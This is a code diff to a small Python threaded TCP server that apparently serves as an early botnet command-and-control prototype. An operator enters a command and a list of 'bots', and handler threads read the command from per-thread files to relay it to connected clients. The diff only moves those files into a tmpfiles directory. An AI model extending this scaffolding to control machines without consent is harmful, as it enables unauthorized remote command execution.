@@ -1,5 +1,6 @@
 import threading
 import socketserver
+from os.path import exists
 
 class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
@@ -8,9 +9,13 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 		cur_thread = threading.current_thread()
 		response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
 		self.request.sendall(response)
+		
+		thread_num = cur_thread.name.split("-")[-1]
+		if (not exists("./tmpfiles/" + thread_num + ".txt")):
+			f = open("tmpfiles/" + thread_num + ".txt", "x")
+			f.close()
 		while True:
-			thread_num = cur_thread.name.split("-")[-1]
-			with open(thread_num + ".txt", 'wr') as file:
+			with open("tmpfiles/" + thread_num + ".txt", 'r+') as file:
 				
 			#Now, let's figure out how to get it to send commands instead!
 				command = file.readline()
@@ -43,7 +48,7 @@ if __name__ == "__main__":
 		command = input("enter a command: ")
 		bots = input("which bots should run this?").split(",")
 		for bot in bots:
-			with open(bot + ".txt", 'w') as file:
+			with open("tmpfiles/" + bot + ".txt", 'w') as file:
 				file.write(command)
 
 	#server.shutdown()
